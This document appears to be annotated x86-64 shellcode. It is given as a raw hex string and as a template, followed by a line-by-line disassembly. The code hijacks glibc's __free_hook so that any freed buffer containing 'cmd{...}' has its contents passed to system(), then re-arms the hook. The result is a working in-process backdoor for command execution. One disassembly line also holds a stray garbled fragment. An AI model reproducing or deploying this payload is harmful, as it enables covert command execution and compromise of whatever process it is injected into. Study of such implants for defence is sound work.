# 48b86062d9d21a7f0000415549bdc0d3d4d21a7f000041544989fc55534c89e352ffd04889c548b8403eeed21a7f000048c700000000004883fd057661803b637554807b016d754e807b02647548807b037b7542c60300488d7b04488d55fc4889f88a084889c34889d5488d4001488d52ff8d71e04080fe5e771b80f97d7508c6030041ffd5eb0e4883fa0175d4bd010000004889c348ffc348ffcdeb9948b8704bd9d21a7f00004c89e7ffd048b837ffe8d21a7f000048a3403eeed21a7f0000585b5d415c415dc3
# 48b84141414141414141415549bd434343434343434341544989fc55534c89e352ffd04889c548b8444444444444444448c700000000004883fd057661803b637554807b016d754e807b02647548807b037b7542c60300488d7b04488d55fc4889f88a084889c34889d5488d4001488d52ff8d71e04080fe5e771b80f97d7508c6030041ffd5eb0e4883fa0175d4bd010000004889c348ffc348ffcdeb9948b842424242424242424c89e7ffd048b8555555555555555548a34444444444444444585b5d415c415dc3'

0:  48 b8 60 62 d9 d2 1a    movabs rax,0x7f1ad2d96260       # malloc_usable_size func addr
7:  7f 00 00
a:  41 55                   push   r13
c:  49 bd c0 d3 d4 d2 1a    movabs r13,0x7f1ad2d4d3c0       # system func addr
13: 7f 00 00
16: 41 54                   push   r12
18: 49 89 fc                mov    r12,rdi                  # address to be freed provided to __free_hook
1b: 55                      push   rbp
1c: 53                      push   rbx
1d: 4c 89 e3                mov    rbx,r12                  # address to be freed provided to __free_hook
20: 52                      push   rdx
21: ff d0                   call   rax                      # call malloc_usable_size to obtain size of memory to be freed
23: 48 89 c5                mov    rbp,rax
26: 48 b8 40 3e ee d2 1a    movabs rax,0x7f1ad2ee3e40       # __free_hook ptr addr
2d: 7f 00 00
30: 48 c7 00 00 00 00 00    mov    QWORD PTR [rax],0x0      # temporarily moves 0x0 into __free_hook ptr addr to disable
37: 48 83 fd 05             cmp    rbp,0x5                  # compares number of bytes to be freed to 5
3b: 76 61                   jbe    0x9e                     # don't run injection code if below or equal to 5
3d: 80 3b 63                cmp    BYTE PTR [rbx],0x63      # checks if first byte to be freed is "c" 
40: 75 54                   jne    0x96
42: 80 7b 01 6d             cmp    BYTE PTR [rbx+0x1],0x6d  # checks if second byte to be freed is "m"
46: 75 4e                   jne    0x96
48: 80 7b 02 64             cmp    BYTE PTR [rbx+0x2],0x64  # checks if third byte to be freed is "d"
4c: 75 48                   jne    0x96
4e: 80 7b 03 7b             cmp    BYTE PTR [rbx+0x3],0x7b  # checks if fourth byte to be freed is "{"
52: 75 42                   jne    0x96
54: c6 03 00                mov    BYTE PTR [rbx],0x0
57: 48 8d 7b 04             lea    rdi,[rbx+0x4]            # moves address of first byte after "cmd{" into rdi
5b: 48 8d 55 fc             lea    rdx,[rbp-0x4]            # moves remaining number of bytes after "cmd{" into rdx
5f: 48 89 f8                mov    rax,rdi                  # moves address of first byte after "cmd{" into rax
62: 8a 08                   mov    cl,BYTE PTR [rax]        # moves first byte after "cmd{" into cl
64: 48 89 c3                mov    rbx,rax                  # moves address of first byte after "cmd{" into rbx
67: 48 89 d5                mov    rbp,rdx                  # moves remaining number of bytes after "cmd{" into rbp
6a: 48 8d 40 01             lea    rax,[rax+0x1]            # moves to next byte
6e: 48 8d 52 ff             lea    rdx,[rdx-0x1]            # decreases number of remaining bytes
72: 8d 71 e0                lea    esi,[rcx-0x20]           # subtracts 32 from the current byte
75: 40 80 fe 5e             cmp    sil,0x5e                 # check if (byte - 32) is above "^" (highest valid char is "}")
79: 77 1b                   ja     0x96
7b: 80 f9 7d                cmp    cl,0x7d                  # checks if current byte is "}"
7e: 75 08                   jne    0x88                     # continues iterating through string if not "}"
80: c6 03 00                mov    BYTE PTR [rbx],0x0       # terminates command string with "\0"
83: 41 ff d5                call   r13                      # calls system function with string beginning at rdi
86: eb 0e                   jmp    0x96
88: 48 83 fa 01             cmp    rdx,0x1
8c: 75 d4                   jne    0x62
8e: bd 01 00 00 00          mov    ebp,0x1
93: 48 89 c3                mov    rbx,rax
96: 48 ff c3                inc    rbx                      # jumps here if next 4 freed bytes don't contain "cmd{", moves to next byte in memory to be freed
99: 48 ff cd                dec    rbp                      # decrements remaining number of blocks in memory to be freed
9c: eb 99                   jmp    0x37                     # jump back to check for "cmd{" in next 4 bytes
9e: 48 b8 70 4b d9 d2 1a    movabs rax,0x7f1ad2d94b70       # free func addr
a5: 7f 00 00
a8: 4c 89 e7                mov    rdi,r12                  # address to be freed
ab: ff d0                   call   rax                      # frees memory
ad: 48 b8 37 ff e8 d2 1a    movabs rax,0x7f1ad2e8ff37       # injection func addr
b4: 7f 00 00movab ds
b7: 48 a3 40 3e ee d2 1a    movabs ds:0x7f1ad2ee3e40,rax    # moves injection func addr back into __free_hook
be: 7f 00 00
c1: 58                      pop    rax
c2: 5b                      pop    rbx
c3: 5d                      pop    rbp
c4: 41 5c                   pop    r12
c6: 41 5d                   pop    r13
c8: c3                      ret
